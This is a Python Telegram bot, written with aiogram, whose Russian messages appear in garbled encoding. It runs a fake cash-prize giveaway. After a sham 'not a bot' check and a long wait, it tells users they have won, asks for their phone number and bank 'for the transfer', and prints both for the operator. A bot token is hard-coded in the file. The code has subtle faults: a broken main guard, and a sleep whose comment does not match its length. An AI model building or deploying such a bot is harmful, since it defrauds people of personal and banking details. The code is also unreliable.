import asyncio
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup

TOKEN = "8585602773:AAH5vMlSQZvmPejYqynypNeoN1pZIIkZBXE"

bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

class Form(StatesGroup):
    phone = State()
    bank = State()

@dp.message_handler(commands=["start"])
async def start(message: types.Message):
    kb = InlineKeyboardMarkup().add(
        InlineKeyboardButton("–Ø –Ω–µ –±–æ—Ç", callback_data="captcha_ok")
    )
    await message.answer(
        "üéÅ –†–æ–∑—ã–≥—Ä—ã—à –¥–µ–Ω–µ–∂–Ω–æ–≥–æ –ø–æ–¥–∞—Ä–∫–∞\n\n"
        "–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤: 10000\n"
        "–ü–æ–±–µ–¥–∏—Ç–µ–ª—å –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.\n\n"
        "–î–ª—è —É—á–∞—Å—Ç–∏—è –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã –Ω–µ –±–æ—Ç:",
        reply_markup=kb
    )

@dp.callback_query_handler(lambda c: c.data == "captcha_ok")
async def captcha_ok(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã –≤ —Ä–æ–∑—ã–≥—Ä—ã—à–µ.\n\n"
        "–û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥–≤–µ–¥–µ–Ω–∏—è –∏—Ç–æ–≥–æ–≤."
    )

    await asyncio.sleep(172800)  # 5 –¥–Ω–µ–π

    await bot.send_message(
        callback.from_user.id,
        "üéâ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º!\n\n"
        "–í—ã —Å—Ç–∞–ª–∏ –ø–æ–±–µ–¥–∏—Ç–µ–ª–µ–º —Ä–æ–∑—ã–≥—Ä—ã—à–∞ –¥–µ–Ω–µ–∂–Ω–æ–≥–æ –ø–æ–¥–∞—Ä–∫–∞.\n\n"
        "–î–ª—è –ø–æ–¥–≤–µ–¥–µ–Ω–∏—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ —É–∫–∞–∂–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:"
    )
    await Form.phone.set()

@dp.message_handler(state=Form.phone)
async def get_phone(message: types.Message, state: FSMContext):
    await state.update_data(phone=message.text)
    await message.answer("üè¶ –£–∫–∞–∂–∏—Ç–µ –±–∞–Ω–∫ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞:")
    await Form.bank.set()

@dp.message_handler(state=Form.bank)
async def get_bank(message: types.Message, state: FSMContext):
    data = await state.get_data()
    print("PHONE:", data["phone"])
    print("BANK:", message.text)

    await message.answer(
        "‚úÖ –î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã.\n\n"
        "–ü–µ—Ä–µ–≤–æ–¥ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è.\n"
        "–°–ø–∞—Å–∏–±–æ –∑–∞ —É—á–∞—Å—Ç–∏–µ!"
    )
    await state.finish()

if name == "__main__":
    executor.start_polling(dp, skip_updates=True)